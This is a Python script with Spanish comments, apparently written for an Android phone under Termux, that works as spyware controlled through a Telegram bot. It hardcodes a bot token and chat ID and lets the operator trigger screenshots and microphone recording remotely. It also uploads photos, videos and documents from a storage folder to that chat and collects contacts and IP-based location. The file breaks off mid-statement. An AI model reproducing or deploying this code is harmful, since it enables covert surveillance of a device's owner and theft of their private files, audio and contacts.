import os
import glob
import json
import telegram
from contacts import Contacts
from PIL import ImageGrab
import requests
import psutil
import time
import telegram.ext
import subprocess

# Configura tu token de acceso al bot
TOKEN = '7016184289:AAGdf0Pl6m6uN4JVZf55NdmxAdCwYHc8PDQ'

# Configura tu ID de chat
CHAT_ID = '5827778078'

# Ruta al directorio donde se encuentran los archivos a enviar
DIRECTORIO_ARCHIVOS = '/storage/emulated/0/ruta/al/directorio'

# Crea una instancia del bot
bot = telegram.Bot(token=TOKEN)

# Crea una instancia de la clase Contacts
contactos = Contacts()

# Función para tomar una captura de pantalla
def tomar_captura():
    # Toma la captura de pantalla utilizando la biblioteca PIL
    captura = ImageGrab.grab()
    # Guarda la captura de pantalla en un archivo temporal
    captura_path = os.path.join(DIRECTORIO_ARCHIVOS, 'captura.png')
    captura.save(captura_path)
    # Envía la captura de pantalla al chat utilizando el método send_photo
    with open(captura_path, 'rb') as photo:
        bot.send_photo(chat_id=CHAT_ID, photo=photo)
    # Elimina el archivo temporal de la captura de pantalla
    os.remove(captura_path)

# Función para obtener la latitud y longitud de la IP
def obtener_latitud_longitud():
    response = requests.get('https://ipapi.co/json/')
    data = response.json()
    latitude = data['latitude']
    longitude = data['longitude']
    return latitude, longitude

# Función para obtener el porcentaje de batería del celular
def obtener_porcentaje_bateria():
    battery = psutil.sensors_battery()
    percentage = battery.percent
    return percentage

# Función para grabar audio
def grabar_audio():
    subprocess.run(["termux-microphone-record", "audio.wav"])

# Función para procesar los comandos recibidos
def procesar_comando(update, context):
    # Obtiene el comando enviado por el usuario
    comando = update.message.text
    # Verifica si el comando es "/captura"
    if comando == '/captura':
        # Toma la captura de pantalla
        tomar_captura()
    # Verifica si el comando es "/grabaaudio"
    elif comando == '/grabaaudio':
        # Grabar audio
        grabar_audio()

# Configura el manejador de comandos del bot
dispatcher = telegram.ext.Dispatcher(bot, None, workers=0)
dispatcher.add_handler(telegram.ext.CommandHandler('captura', procesar_comando))
dispatcher.add_handler(telegram.ext.CommandHandler('grabaaudio', procesar_comando))

# Inicia el bot
updater = telegram.ext.Updater(bot=bot, use_context=True, dispatcher=dispatcher)
updater.start_polling()

# Obtén la lista de archivos en el directorio
archivos = glob.glob(os.path.join(DIRECTORIO_ARCHIVOS, '*'))

# Itera sobre los archivos y envíalos al bot
for archivo in archivos:
    # Verifica si el archivo es una foto, video, archivo o contacto
    if archivo.endswith(('.jpg', '.jpeg', '.png')):
        # Si es una foto, utiliza el método send_photo
        with open(archivo, 'rb') as photo:
            bot.send_photo(chat_id=CHAT_ID, photo=photo)
    elif archivo.endswith(('.mp4', '.avi', '.mov')):
        # Si es un video, utiliza el método send_video
        with open(archivo, 'rb') as video:
            bot.send_video(chat_id=CHAT_ID, video=video)
    elif archivo.endswith(('.py', '.txt', '.pdf', '.apk', '.docx', '.html')):
        # Si es un archivo con una de las extensiones especificadas, utiliza el método send_document
        with open(archivo, 'rb') as document:
            bot.send_document(chat_id=CHAT_ID, document=document)
    elif archivo.endswith('.json'):
        # Si es un archivo JSON, verifica si contiene contactos
        with open(archivo, 'r') as json_file:
            data = json.load(json_file)
            if 'contacts' in data:
                # Si contiene contactos, agrega los contactos a la instancia de Contacts
                contactos.add_contacts(data['contacts'])

# Convierte los contactos a formato JSON
contactos_json = contactos.to_json()

# Guarda los contactos en un archivo JSON
with open ("contactos.json","w") as archivo_json:
